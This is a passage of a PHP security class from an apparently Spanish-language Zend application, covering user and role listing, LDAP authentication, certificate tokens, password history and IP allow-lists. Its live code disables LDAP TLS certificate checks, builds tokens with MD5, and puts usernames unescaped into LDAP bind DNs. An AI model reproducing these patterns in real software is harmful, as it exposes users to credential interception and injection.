     * @method listadoUsuariosCompartimentados($iddominio, $idusuario)
     *
     * @param INTEGER - Identificador del dominio.
     * @param INTEGER - Identificador del usuario.
     *
     * @return ARRAY - Listado con todos los usuarios que pueden ser manipulados
     * por el usuario logeado.
     */
    public function listadoUsuariosCompartimentados($iddominio, $idusuario)
    {
        $idUser = SegUsuario::listadoUsuariosCompartimentados(
            $idusuario, $iddominio
        );

        return SegUtil::convertToUnidimensional($idUser, 'idusuario');
    }

    /**
     * - Retorna todos los metadatos de los usuarios que pueden ser manipulados
     *  por el usuario logeado.
     * @method UsuariosCompartimentados($certificate, $iddominio, $idusuario)
     *
     * @param STRING - Token de seguridad.
     * @param NUMERIC - Identificador del dominio del
     * usuario logueado.
     * @param NUMERIC - Identificador del usuario logueado.
     *
     * @return ARRAY - Listado con todos los metadatos de los usuarios que pueden ser manipulados
     *  por el usuario logeado.
     */
    public function UsuariosCompartimentados(
        $certificate, $iddominio, $idusuario
    )
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if ($idusuario) {
            return self::datosGridUsuarios(
                SegUsuario::cargarGridUsuario($idusuario, $iddominio, 100000, 0)
            );
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Retorna todos los metadatos de los usuarios
     * que pueden ser manipulados por el usuario logeado
     * y tengan asociado datos de la persona.
     * @method ObtenerUsuariosPersona($certificate, $idusuario, $iddominio)
     *
     * @param STRING - Token de seguridad.
     * @param NUMERIC - Identificador del dominio del
     * usuario logueado.
     * @param NUMERIC - Identificador del usuario logueado.
     *
     * @return ARRAY - Listado que contiene
     * todos los metadatos de los usuarios
     * que pueden ser manipulados por el usuario logeado
     * y tengan asociado datos de la persona.
     */
    public function ObtenerUsuariosPersona($certificate, $idusuario, $iddominio)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if ($idusuario) {
            $lUser = SegUsuario::listadoUsuariosCompartimentados(
                $idusuario, $iddominio
            );
            $idUser = SegUtil::convertToUnidimensional($lUser, 'idusuario');
            $datosusuario = SegUsuario::cargarGridUsuarioPersona($idUser);
            $arrayresult = self::datosUsuariosPersona($datosusuario);

            return $arrayresult;
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Retorna un objeto con los datos del usuario.
     * @method getUsersNameById($arrayId)
     * @param ARRAY - Listado de identificadores de usuarios.
     *
     * @return ARRAY
     */
    public function getUsersNameById($arrayId)
    {
        return SegUsuario::getUsersNameById($arrayId);
    }

    /**
     * - Retorna un objeto con los datos del rol.
     * @param ARRAY - Listado de identificadores de roles.
     *
     * @return ARRAY
     */
    public function getRoleNameById($arrayIdRol)
    {
        return SegRol::getRoleNameById($arrayIdRol);
    }

    /**
     * - Retorna un objeto con los datos del usuario.
     * @method getIdPersonaByIdUsuario($idusuario)
     * @param NUMERIC - Identificador del usuario.
     *
     * @return ARRAY
     */
    public function getIdPersonaByIdUsuario($idusuario)
    {
        $result = SegUsuario::getIdPersonaByIdUsuario($idusuario);

        return $result;
    }

    /**
     * - Función que retorna un listado con los sistemas, funcionalidades y
     * acciones a las que el usuario tiene acceso.
     * @method getSystemsFunctionsActions($certificate, $idsistema, $identidad)
     *
     *
     * @param STRING - Certificado del usuario usuario.
     * @param NUMERIC - Id del subsistema.
     * @param NUMERIC - Id de estructura del usuario logeado.
     *
     * @return ARRAY - Listado con los sistemas, funcionalidades y
     * acciones a las que el usuario tiene acceso.
     */
    public function getSystemsFunctionsActions(
        $certificate, $idsistema, $identidad
    )
    {
        $funcionalidad = array();
        $tmpidsistema = explode('_', $idsistema);
        if (count($tmpidsistema) >= 1) {
            $idsistema = $tmpidsistema[0];
        }
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos) > 0) {
            $idusuario = $datos[0]->idusuario;
            $access = self::getRol($idusuario, $identidad);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $access);
            $funcionalidad = DatFuncionalidad::cargarfuncionalidadesacciones(
                $idsistema, $rol[0]->idrol
            );
        } else {
            throw new ZendExt_Exception('SGIS003');
        }

        return $funcionalidad;
    }

    /**
     * - Función que retorna un listado con las acciones con
     * permisos dado un identificador de sistema.
     * @method obtenerAccionesConPermisosByIdsistema($idsistema)
     *
     * @param NUMERIC - Identificador del sistema.
     *
     * @return ARRAY - Listado con las acciones con
     * permisos dado un identificador de sistema.
     */
    public function obtenerAccionesConPermisosByIdsistema($idsistema)
    {

        $global = ZendExt_GlobalConcept::getInstance();
        $acciones = DatAccion::cargarAccionesByidsistemaByRol($idsistema, $global->Perfil->idrol);

        return $acciones;
    }

    /**
     * - Función que retorna un listado con los metadatos de los usuarios que estan
     * relacionados con los idpersona solicitados por parámetro.
     * @method getUsersInformationByArrayIdPersona($arrayIdPersonas)
     *
     * @param NUMERIC - Id de estructura del usuario logeado.
     *
     * @return ARRAY - Listado con los metadatos de los usuarios que estan
     * relacionados con los idpersona solicitados por parámetro.
     */
    public function getUsersInformationByArrayIdPersona($arrayIdPersonas)
    {
        return SegUsuario::obtenerUsuarioPorArrayIdPersona($arrayIdPersonas);
    }

    /**
     * - Función que retorna un listado los metadatos.
     * de los usuarios que estan relacionados personas.
     * @method getUsersPersonInformation()
     * @param - Ninguno
     * @return ARRAY - Listado con los metadatos.
     */
    public function getUsersPersonInformation()
    {
        return SegUsuario::getUsersPersonInformation();
    }

    /**
     * - Retorna un listado con la
     * información del usuario (idusuario, idpersona).
     * @method getIdPersona($userName)
     * @param STRING - Nombre de usuario.
     *
     * @return ARRAY - Listado con la informaci&oacute;n del usuario.
     */
    public function getIdPersona($userName)
    {
        return SegUsuario::getIdPersona($userName);
    }

    /**
     * - Retorna un listado con la información de los
     * usuarios (idusuario, idpersona).
     * @method getArrayIdPersonaByArrayUsers($arrayUsers)
     *
     * @param ARRAY - Listado de identificadores de usuarios.
     *
     * @return ARRAY - Listado con la información de los
     * usuarios.
     */
    public function getArrayIdPersonaByArrayUsers($arrayUsers)
    {
        return SegUsuario::getArrayIdPersonaByArrayUsers($arrayUsers);
    }

    /**
     * - Retorna un listado con los identificadores de personas
     * que se encuentran asociado a los usuarios.
     * @method getArrayIdPersonaByUsersName($arrayUsers)
     *
     * @param ARRAY - Listado de nombres de usuario
     * @return ARRAY - listado con los identificadores de personas
     * que se encuentran asociado a los usuarios.
     */
    public function getArrayIdPersonaByUsersName($arrayUsers)
    {
        return SegUtil::convertToUnidimensional(
            SegUsuario::getArrayIdPersonaByUsersName($arrayUsers), 'idpersona'
        );
    }

    /**
     * - Lista los usuarios por lotes.
     * @method gettodosLosUsuarios($limit, $start)
     * @param INTEGER - Cantidad de usuarios que serán listados.
     * @param INTEGER - Valor inicial para comenzar el paginado.
     *
     * @return ARRAY - Listado de usuarios.
     */
    public function gettodosLosUsuarios($limit, $start)
    {
        $model = new SegUsuarioModel();

        return $model->gettodosLosUsuarios($limit, $start);
    }

    /**
     * - Retorna la cantidad total de usuarios en el sistema.
     * @method getcanttodosLosUsuarios()
     * @param - Ninguno
     * @return INTEGER - Cantidad de usuarios.
     */
    public function getcanttodosLosUsuarios()
    {
        $model = new SegUsuarioModel();

        return $model->getcanttodosLosUsuarios(); //Entero positivo
    }

    /**
     * - Lista todos los usuarios del sistema sin tener en cuenta
     * si estan asociados a una persona o no.
     * @method getallUsers($limit, $start)
     * @param INTEGER - Cantidad de usuarios que serán listados.
     * @param INTEGER - Valor inicial para comenzar el paginado.
     *
     * @return ARRAY - Listado de usuarios.
     */
    public function getallUsers($limit, $start)
    {
        $model = new SegUsuarioModel();

        return $model->getallUsers($limit, $start);
    }

    /**
     * - Retorna un listado de identificadores
     * de estructura que pertenecen al dominio del usuario y que ademas el
     * mismo tenga roles en ellas.
     * @method getIdsEntityByRole()
     * @param - Ninguno
     * @return ARRAY - Listado de identificadores de estructura | 0 de no
     * existir roles configurados.
     */
    public function getIdsEntityByRole()
    {
        $global = ZendExt_GlobalConcept::getInstance();
        $integrator = ZendExt_IoC::getInstance();
        $dEntUsRol = DatEntidadSegUsuarioSegRol::getAccess(
            $global->Perfil->idusuario
        );
        $arrayAccess = SegUtil::convertToUnidimensional($dEntUsRol, 'identidad');
        if (count($arrayAccess) > 0) {
            return $integrator->metadatos->getIdsEntityByRoleIndex(
                $global->Perfil->iddominio, $arrayAccess
            );
        } else {
            return 0;
        }
    }

    /**
     * - Retorna un listado de
     * identificadores de estructura que
     * pertenecen al dominio del usuario y que además el mismo tenga roles
     *  en ellas.
     * @method getIdsEntityByUser($idusuario)
     * @param NUMERIC - Identificador del ususario.
     * @return ARRAY - Listado de identificadores de estructura | 0 de no
     * existir roles configurados.
     */
    public function getIdsEntityByUser($idusuario)
    {

        $integrator = ZendExt_IoC::getInstance();
        $dEntUsRol = DatEntidadSegUsuarioSegRol::getAccess($idusuario);
        $arrayAccess = SegUtil::convertToUnidimensional($dEntUsRol, 'identidad');
        $domain = SegUsuarioNomDominio::getUserDomain($idusuario);
        $domain = SegUtil::convertToUnidimensional($domain, 'iddominio');
        if (count($arrayAccess) > 0) {
            return $integrator->metadatos->getIdsEntityByRoleIndex(
                $domain[0], $arrayAccess
            );
        } else {
            return 0;
        }
    }

    /**
     * - Retorna un listado de
     * identificadores de estructura que pertenecen al dominio del usuario
     * autenticado y que además el mismo tenga roles en ellas.
     * @method ObtenerListadoIdUsuarioRolEntidad()
     * @param - Ninguno
     * @return ARRAY - Listado de identificadores de usuario, rol y entidades.
     */
    public function ObtenerListadoIdUsuarioRolEntidad()
    {
        $global = ZendExt_GlobalConcept::getInstance();
        $integrator = ZendExt_IoC::getInstance();
        $arrayUsuarioRolAcceso = DatEntidadSegUsuarioSegRol::
        cargarentidadesusuario($global->Perfil->idusuario);
        if (count($arrayUsuarioRolAcceso) > 0) {
            return $integrator->metadatos->obtenerListadoEntidadesUsuarioRol(
                $arrayUsuarioRolAcceso
            );
        } else {
            return array();
        }
    }

    /**
     * - Retorna un listado de
     * identificadores de estructura hijos de la estructura dada por parametros
     * a las cuales tiene acceso el usuario logueado en el sistema dentro
     * de su dominio.
     * @method obtenerListadoIdEstructura($identidad)
     *
     * @param NUMERIC - Identificador de la estructura.
     *
     * @return ARRAY - Listado de identificadores de estructura.
     */
    public function obtenerListadoIdEstructura($identidad)
    {
        $global = ZendExt_GlobalConcept::getInstance();
        $integrator = ZendExt_IoC::getInstance();
        $datEntUsRol = DatEntidadSegUsuarioSegRol::cargarentidadesusuario(
            $global->Perfil->idusuario
        );
        $arrayIdAcceso = SegUtil::convertToUnidimensional(
            $datEntUsRol, 'identidad'
        );

        return $integrator->metadatos->obtenerListadoIdEstructura(
            $arrayIdAcceso, $identidad
        );
    }

    /**
     * - Retorna un listado
     * de roles compartimentados del dominio del perfil.
     * @method obtenerListadoRolesCompartimentados()
     * @param - Ninguno
     * @return ARRAY - Listado de roles compartimentados.
     */
    public function obtenerListadoRolesCompartimentados()
    {
        $filtroDominio = ZendExt_GlobalConcept::
        getInstance()->Perfil->iddominio;
        $arrayRolesDominio = SegRolNomDominio::
        RolesdelDominio($filtroDominio); //todos los roles del dominio
        $arrayRolesDominio = SegUtil::
        convertToUnidimensional($arrayRolesDominio, 'idrol');
        $arrayRolesPermisoDominio = SegCompartimentacionroles::
        cargarRolesDominio($filtroDominio);
        $arrayRolesPermisoDominio = SegUtil::convertToUnidimensional(
            $arrayRolesPermisoDominio,
            'idrol'
        );
        $arrayResult = array_merge(
            $arrayRolesDominio,
            $arrayRolesPermisoDominio
        );

        return SegRol::obtenerRolesCompartimentados($arrayResult);
    }

    /**
     * @method AD_Autentication($objLdap, $user, $password) - Función privada
     * que autentica contra cualquier directorio activo
     *
     * @param DoctrineCollection $objLdap - Objeto DoctrineCollection de
     * servidor de Autenticación del usuario.
     * @param string $user - Usuario que se esta autenticando
     * @param string $password - Clave de acceso del usuario
     *
     * @return boolean - boolean.
     */
    private static function AD_Autentication($objLdap, $user, $password)
    {
        /*
        $rsaFacade = new ZendExt_RSA_Facade();
        //$password = $rsaFacade->decrypt($password);
        $sDRoot = $_SERVER['DOCUMENT_ROOT'];
        $dSep = DIRECTORY_SEPARATOR;
        $dirCerts = substr($sDRoot, 0, strrpos($sDRoot, 'web')) . 'config'
            . $dSep . 'certs' . $dSep . 'auth' . $dSep;
        $rsa = new ZendExt_Crypt_Rsa(new ZendExt_Crypt_Rsa_Config($dirCerts));
        $arrayOptions = array();
        if ($objLdap->basedn) {
            $acountDomainName = self::createAccountDomainName($objLdap->basedn);
        } else {
            $acountDomainName =self::createAccountDomainName($objLdap->usuario);
        }
        $arrayOptions['host'] = ($objLdap->ipservidor)
            ? $objLdap->ipservidor
            : '';
        $arrayOptions['port'] = ($objLdap->puerto)
            ? $objLdap->puerto
            : '';
        $arrayOptions['accountDomainName'] = $acountDomainName;
        $arrayOptions['useStartTls'] = ($objLdap->tsl)
            ? $objLdap->tsl
            : '';

        $arrayOptions['baseDn'] = ($objLdap->basedn)
            ? $objLdap->basedn
            : '';
        $arrayOptions['username'] = ($objLdap->usuario)
            ? $objLdap->usuario
            : '';
        $arrayOptions['password'] = ($objLdap->password)
            ? $rsa->decrypt($objLdap->password)
            : '';
        $arrayOptions['optReferrals'] = true;
        if ($objLdap->tservidor == 'openldap') {
            $arrayOptions['bindRequiresDn'] = true;
        }
        $options = array('server' => $arrayOptions);
        $auth = Zend_Auth::getInstance();
        $adapter = new Zend_Auth_Adapter_Ldap($options, $user, $password);
        $result = $auth->authenticate($adapter);
        $messages = $result->getMessages();
        if ($messages[0]) {
            $errorMessage = '';
            foreach ($messages as $message) {
                if (!$message)
                    break;
                $errorMessage = $message;
            }
            $log = new ZendExt_Exception_Log(
                new ZendExt_Exception(
                    'NOCONTROLLED',
                    new Exception($errorMessage)
                )
            );
            $log->handle();
            return false;
        }
        return true;
        */
        $tservidor = $objLdap->tservidor;
        $ipservidor = $objLdap->ipservidor;
        $puerto = $objLdap->puerto;

        if ($objLdap->basedn) {
            $acountDomainName = self::createAccountDomainName($objLdap->basedn);
        } else {
            $acountDomainName = self::createAccountDomainName($objLdap->usuario);
        }

        try {
            if (@ldap_connect($ipservidor, $puerto)) {
                ldap_set_option(@ldap_connect($ipservidor, $puerto), LDAP_OPT_PROTOCOL_VERSION, 3);
                ldap_set_option(@ldap_connect($ipservidor, $puerto), LDAP_OPT_REFERRALS, 0);
                if ($tservidor == 'ldap') {
                    if (@ldap_bind(@ldap_connect($ipservidor, $puerto), $user . "@" . $acountDomainName, $password)) {
                        return true;
                    } else {
                        return false;
                    }
                } else {
                    $ds = ldap_connect($ipservidor, $puerto);
                    ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
                    ldap_set_option($ds, LDAP_OPT_REFERRALS, 0);
                    if ($bind = ldap_bind($ds, "uid=" . $user . "," . $objLdap->basedn, $password)) {
                        return true;
                    } else {
                        return false;
                    }
                }

            } else {
//                var_dump('false1');die;
                return false;
            }
        } catch (Exception $e) {
            print_r($e->getMessage());
            exit;
        }
    }

    /**
     * @method createAccountDomainName($string) - Función privada usada para
     * crear la cuenta de nombre de dominio.
     * @param string $string - Cadena de búsqueda puede ser el usuario
     * (conexión DN) o el basedn.
     *
     * @return string - string.
     */
    private static function createAccountDomainName($string)
    {
        $string = strtolower($string);
        $stringResult = '';
        $string = substr($string, strpos($string, 'dc'), strlen($string));
        $array = explode(',', $string);
        $cant = count($array);
        foreach ($array as $dc) {
            $result = explode('dc=', $dc);
            if ($cant == 1) {
                $stringResult .= $result[1];
            } else {
                $stringResult .= $result[1] . '.';
                $cant--;
            }
        }

        return $stringResult;
    }

    /**
     * @method accountDomainNameShort($acountDomainName) - Funcion privada
     * usada para crear el nombre
     * corto de la cuenta de nombre de dominio.
     *
     * @param string $acountDomainName - Cadena que contiene el
     * nombre de dominio.
     *
     * @return string - string.
     */
    /*private static function accountDomainNameShort($acountDomainName)
    {
        $acountDomainName = explode('.', $acountDomainName);

        return $acountDomainName[0];
    }*/

    /**
     * @method returnCertificate($mac, $idusuario, $user) - Actualiza o crea
     * un certificado al usuario autenticado.
     * @param integer $idusuario - Id del usuario que se esta autenticando.
     * @param string $mac - Mac de la PC (Por el momento se esta
     * guardando el IP).
     * @param string $user - Usuario.
     *
     * @return string            - Certificado o token de seguridad
     * asignado al usuario.
     */
    private static function returnCertificate($mac, $idusuario, $user)
    {
        $objCertificado = new SegCertificado();
        $fecha = date('d/m/Y H:i:s');
        $arrayResult = self::createCertificate($user, $mac, $fecha);
        $resultCertificado = $objCertificado->existecertificado(
            $idusuario, $mac
        );
        if (count($resultCertificado)) {
            self::updateCertificate(
                $mac,
                $resultCertificado[0]['idcertificado'],
                $arrayResult['TOKEN']
            );
        } else {
            $objCertificado->mac = $mac;
            $objCertificado->valor = $arrayResult['TOKEN'];
            $objCertificado->idusuario = $idusuario;
            $modelcertificado = new SegCertificadoModel();
            $modelcertificado->insertarcertificado($objCertificado);
        }

        return $arrayResult['CERTIFICADO'];
    }

    public function madeCertificateData($mac, $idusuario, $user)
    {
        $data = $this->createCertificate($user, $mac, $idusuario);
        (new SegCertificado())->createOrUpdateCertificado(array(
            'valor' => $data['TOKEN'],
            'mac' => $mac,
            'idusuario' => $idusuario
        ));
        return $data['CERTIFICADO'];
    }

    /**
     * @method updateCertificate($mac, $idcertificate, $token) - Cambia el
     * valor del certificado asignado al usuario.
     * @param string $mac - Mac de la PC cliente.
     * @param string $idcertificate - Identificador del certificado.
     * @param string $token - Token del certificado.
     */
    private static function updateCertificate($mac, $idcertificate, $token)
    {
        $objCertificado = Doctrine::getTable('SegCertificado')
            ->find($idcertificate);
        $objCertificado->mac = $mac;
        $objCertificado->valor = $token;
        $ojjModel = new SegCertificadoModel();
        $ojjModel->updateCertificado($objCertificado);
    }

    /**
     * @method createCertificate($usuario, $mac, $fecha) - Crea un
     * certificado a partir del identificador del usuario
     * @param string $usuario - Usuario
     * @param string $mac - Mac de la PC cliente
     * @param string $fecha - Fecha de creación del certificado
     *
     * @return array - Certificado
     */
    private static function createCertificate($usuario, $mac, $fecha)
    {
        $rSA = new ZendExt_RSA_Facade();
        $iD = md5('Quarseg' . $usuario . $fecha . $mac);
        $tOKEN = md5(self::createToken($usuario, $fecha));
        $docRoot = $_SERVER['DOCUMENT_ROOT'];
        $cerTemp = '/apps/seguridad/comun/recursos/xml/Certificado_template.xml';
        $dirXML = substr($docRoot, 0, strrpos($docRoot, '/web')) . $cerTemp;
        $contenido = file_get_contents($dirXML);
        $contenido = str_replace('<FECHA_EMISION>', $fecha, $contenido);
        $contenido = str_replace('<USER_NAME>', $usuario, $contenido);
        $contenido = str_replace('<TOKEN_ID>', $tOKEN, $contenido);
        $contenido = str_replace('<IDENTIFICADOR>', $iD, $contenido);
        $contenido = str_replace('<MAC>', $mac, $contenido);

        return array(
            'TOKEN' => $tOKEN,
            'CERTIFICADO' => $rSA->encrypt($contenido)
        );
    }

    /**
     * @method createToken($usuario, $fecha) - Crea el TOKEN de seguridad
     * que tendrá el certificado.
     * @param string $usuario - Nombre de usuario.
     * @param string $fecha - Fecha de generación del Token de Seguridad.
     *
     * @return string - Token de seguridad.
     */
    private static function createToken($usuario, $fecha)
    {
        $remAddr = ZendExt_App::ipRealPcCliente();
        $userAgt = $_SERVER['HTTP_USER_AGENT'];

        return 'TOKEN:<' . $remAddr . ' ' . $userAgt . ' ' . $usuario . ' '
            . $fecha . ' Quarseg >';
    }

    /**
     * @method fecha($caducidad) -
     * @param string $caducidad - Fecha inicial en que se crea el usuario.
     *
     * @return integer.
     */
    private static function fecha($caducidad)
    {
        $query = SegRestricclaveacceso::cargarclave(0, 0);
        $exp = $query[0]['diascaducidad'];
        $fechaCreacion = explode('/', $caducidad);
        $fechaCreacion = implode('-', $fechaCreacion);
        $date = new DateTime($fechaCreacion);
        $cadena = "+" . $exp . " day";
        $date->modify($cadena);
        $caduca = $date->format("d-m-Y");
        $fechaActual = date("d-m-Y");
        if (self::compara_fechas($fechaActual, $caduca) < 0) {
            return self::dateDiff($caduca, $fechaActual);
        } else {
            return 0;
        }
    }

    /**
     * @method compara_fechas($fecha1, $fecha2) - Compara si existe
     * diferencias entre dos fechas.
     * @param String $fechaOne
     * @param String $fechaTwo
     *
     * @return integer - Negativo si existe diferencia, positivo
     * de lo contrario.
     */
    private static function compara_fechas($fechaOne, $fechaTwo)
    {
        if (
            preg_match("/[0-9]{1,2}\/[0-9]{1,2}\/([0-9][0-9]){1,2}/", $fechaOne)
        ) {
            list($diaOne, $mesOne, $anoOne) = preg_split("/[\/]+/", $fechaOne);
        }
        if (
            preg_match("/[0-9]{1,2}-[0-9]{1,2}-([0-9][0-9]){1,2}/", $fechaOne)
        ) {
            list($diaOne, $mesOne, $anoOne) = preg_split("/-/", $fechaOne);
        }
        if (
            preg_match("/[0-9]{1,2}\/[0-9]{1,2}\/([0-9][0-9]){1,2}/", $fechaTwo)
        ) {
            list($diaTwo, $mesTwo, $anoTwo) = preg_split("/[\/]+/", $fechaTwo);
        }
        if (
            preg_match("/[0-9]{1,2}-[0-9]{1,2}-([0-9][0-9]){1,2}/", $fechaTwo)
        ) {
            list($diaTwo, $mesTwo, $anoTwo) = preg_split("/-/", $fechaTwo);
        }
        $dif = mktime(0, 0, 0, $mesOne, $diaOne, $anoOne)
            - mktime(0, 0, 0, $mesTwo, $diaTwo, $anoTwo);

        return ($dif);
    }

    /**
     * @method dateDiff($FI, $FF) - Método que compara la diferencia en días
     * que existe entre dos fechas.
     * @param string $fechaInicial - Fecha inicial.
     * @param string $fechaFinal - Fecha final.
     *
     * @return integer - Retorna la diferencia en días entre las fechas.
     */
    private static function dateDiff($fechaInicial, $fechaFinal)
    {
        list($diaI, $mesI, $anoI) = preg_split("/[\/.-]+/", $fechaInicial);
        list($diaF, $mesF, $anoF) = preg_split("/[\/.-]+/", $fechaFinal);
        $timestampInicial = mktime(0, 0, 0, $mesI, $diaI, $anoI);
        $timestampFinal = mktime(0, 0, 0, $mesF, $diaF, $anoF);
        $segundosDiferencia = $timestampInicial - $timestampFinal;
        $diasDiferencia = $segundosDiferencia / (60 * 60 * 24);
        $diasDiferencia = abs($diasDiferencia);
        $diasDiferencia = floor($diasDiferencia);

        return $diasDiferencia;
    }

    /**
     * @param integer $idusuario - Identificador del usuario.
     * @param type $newpass - Contraseña en formato md5.
     *
     * @return bool
     * @author Darien García Tejo.
     * @method verificarHistorialClave($idusuario, $newpass) - Verifica que
     * la clave no se repita
     *         en el tiempo establecido.
     *
     */
    /*private static function verificarHistorialClave($idusuario, $newpass)
    {
        $restrict = SegRestricclaveacceso::cargarclave(1, 0);
        $cantidad = SegClaveacceso::obtenerClaveFechaFin($idusuario, $newpass);
        if ($cantidad > $restrict[0]['historicoPass'] || $cantidad == 0) {
            return true;
        }

        return false;
    }*/

    /**
     * @method verificarHistorialClave($idusuario, $newpass) - Verifica que
     * la clave no se repita teniendo en cuenta el historial existenete.
     *
     * @param integer $idusuario - Identificador del usuario.
     * @param type $newpass - Contraseña en formato md5.
     *
     * @return bool
     */
    private static function verificarHistorialClave($idusuario, $newpass)
    {
        $restrict = SegRestricclaveacceso::cargarclave(1, 0)[0]['historicoPass'];
        $historicoClaves = SegClaveacceso::obtenerHistoricoClaves($idusuario);
        if (count($historicoClaves) > $restrict) {
            $cant = count($historicoClaves) - $restrict;
            $eliminar = array_slice($historicoClaves, 0, $cant);
            $arrayId = array();
            foreach ($eliminar as $e) {
                array_push($arrayId, $e['idclaveacceso']);
            }
            SegClaveacceso::eliminarClaveMasAntigua($arrayId);
            array_splice($historicoClaves, 0, $cant);
        }
        $existeEnHistorial = false;
        foreach ($historicoClaves as $his) {
            if ($newpass == $his['clave']) {
                $existeEnHistorial = true;
            }
        }

        if (!$existeEnHistorial) {
            if (count($historicoClaves) <= $restrict) {
                return true;
            } else {
                SegClaveacceso::eliminarClaveMasAntigua($historicoClaves[0]['idclaveacceso']);
                return true;
            }
        } else {
            return false;
        }
    }

    /**
     * @method cantidadEstructuras($iddominio) - Retorna las estructuras
     * que pertenecen al dominio.
     * @param string $iddominio - Identificador del dominio.
     *
     * @return array - Entidades que pertenecen al dominio.
     */
    private static function cantidadEstructuras($iddominio)
    {
        return SeguridadECProxy::getInstance()->buscarIdEstructurasDominio(
            $iddominio, array(), 1
        );
    }

    /**
     * @method extractSecurityToken($certificate) -Extrae el TOKEN de
     * seguridad del certificado del usuario.
     * @param $certificate - Certificado del usuario.
     *
     * @return string        - Token de seguridad.
     */
    public function extractSecurityToken($certificate)
    {
        $rSA = new ZendExt_RSA_Facade();
        $stringCertificate = $rSA->decrypt($certificate);
        $xML = new SimpleXMLElement($stringCertificate);

        return (string)$xML->attributes()->token;
    }

    /**
     * @method getArrayReferencias($value) - Retorna el ACL del
     * usuario autenticado.
     * @param array $value - listado de valores.
     *
     * @return array - ACL del usuario autenticado.
     */
    private static function getArrayReferencias($value)
    {
        $arrayResult = array();
        foreach ($value as $url) {
            $urlAux = substr($url['url'], 0, strrpos($url['url'], '/'))
                . '/' . $url['accion'];
            $arrayResult[md5($url)] = $url['url'];
            $arrayResult[md5($urlAux)] = $urlAux;
        }

        //return array_values(array_unique($arrayResult));
        return ($arrayResult);
    }

    /**
     * @method verificarIP($ip, $arraybd) -Verifica que la el IP de la PC
     *  Cliente se encuentre en la lista de accesos.
     * @param string $ip - IP de la PC Cliente.
     * @param string $arraybd - listado de accesos.
     *
     * @return boolean - boolean.
     */
    private static function verificarIP($ip, $arraybd = null)
    {
        if ($arraybd) {
            $arraybd = explode(',', $arraybd);
            $ip = explode(',', $ip)[0];
            $ip = explode('/', $ip);
            foreach ($arraybd as $key => $array) {
                $result[$key] = explode('/', $array);
            }
            foreach ($result as $rest) {
                if (self::compreobarIP($ip, $rest, $rest[1])) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * @method ipMatch($ip, $arraybd) -Verifica que la el IP de la PC
     *  Cliente se encuentre en la lista de accesos.
     * @param string $ipVerificar - IP de la PC Cliente.
     * @param string $arraybd - listado de accesos.
     *
     * @return boolean - boolean.
     */
    public static function ipMatch($ipVerificar, $listaAccesos = null)
    {
        if ($listaAccesos) {
            $arraybd = explode(',', $listaAccesos);
            $ipVerificar = explode('/', $ipVerificar);
            foreach ($arraybd as $key => $array) {
                $result[$key] = explode('/', $array);
            }
            foreach ($result as $rest) {
                if (self::compreobarIP($ipVerificar, $rest, $rest[1])) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * @method compreobarIP($valor1, $valor2, $opc) - Verifica que la el IP de
     * la PC Cliente se encuentre en la lista de accesos.
     *
     * @param string $argOne - IP de la PC Cliente.
     * @param string $argTwo - IP del listado de accesos.
     * @param string $opc - Opción.
     *
     * @return integer - integer.
     */
    private static function compreobarIP($argOne, $argTwo, $opc)
    {
        $resultOne = explode('.', $argOne[0]);
        $resultTwo = explode('.', $argTwo[0]);
        if ($opc == '0') {
            return 1;
        } elseif ($opc == '8') {
            if (($resultOne[0] == $resultTwo[0])) {
                return 1;
            }
        } elseif ($opc == '16') {
            if (($resultOne[0] == $resultTwo[0])
                && ($resultOne[1] == $resultTwo[1])
            ) {
                return 1;
            }
        } elseif ($opc == '24') {
            if (($resultOne[0] == $resultTwo[0])
                && ($resultOne[1] == $resultTwo[1])
                && ($resultOne[2] == $resultTwo[2])
            ) {
                return 1;
            }
        } elseif ($opc == '32') {
            if (($resultOne[0] == $resultTwo[0])
                && ($resultOne[1] == $resultTwo[1])
                && ($resultOne[2] == $resultTwo[2])
                && ($resultOne[3] == $resultTwo[3])
            ) {
                return 1;
            }
        } else {
            if (($resultOne[0] == $resultTwo[0])
                && ($resultOne[1] == $resultTwo[1])
                && ($resultOne[2] == $resultTwo[2])
                && ($resultOne[3] == $resultTwo[3])
            ) {
                return 1;
            }
        }

        return 0;
    }

    private static function changePasswordLdap($servidorAut, $usuario, $oldPassword, $newPassword)
    {
        if ($servidorAut['DatSerautenticacion']["tservidor"] === "ldap") {
            $ip = $servidorAut['ip'];
            putenv('LDAPTLS_REQCERT=allow');//No comprueba el certificado
            $ldap = ldap_connect("ldaps://{$ip}", 636);
            //Tiempo de espera para la respuesta del ldap 10s
//            ldap_set_option($ldap, LDAP_OPT_NETWORK_TIMEOUT, 10);
//            ldap_set_option($ldap, LDAP_OPT_TIMELIMIT, 10);
//            ldap_set_option($ldap, LDAP_OPT_TIMEOUT, 10);

            //Lanzo una excepcion si no se puede conectar al servidor ldap (AD)
            if (!$ldap) {
                throw new ZendExt_Exception('EP016');
            }

            ldap_set_option($ldap, LDAP_OPT_PROTOCOL_VERSION, 3);
            ldap_set_option($ldap, LDAP_OPT_REFERRALS, 0);

            //DN del usuario con privilegios para cambiar la contraseña
            $adminDn = $servidorAut['DatSerautenticacion']["usuario"];
            //Password del usuario con privilegios
            $dirCerts = substr($_SERVER['DOCUMENT_ROOT'], 0, strrpos($_SERVER['DOCUMENT_ROOT'], 'web')) . 'config' . DIRECTORY_SEPARATOR . 'certs' . DIRECTORY_SEPARATOR . 'auth' . DIRECTORY_SEPARATOR;
            $rsa = new ZendExt_Crypt_Rsa(new ZendExt_Crypt_Rsa_Config($dirCerts));
            $adminPs = $rsa->decrypt($servidorAut['DatSerautenticacion']["password"]);
            $adminBn = ldap_bind($ldap, $adminDn, $adminPs);

            if (!$adminBn) {
                throw new ZendExt_Exception('EP017');
            }

            $recurso = ldap_search(
                $ldap,//Conexion
                $servidorAut['DatSerautenticacion']["basedn"],//DN
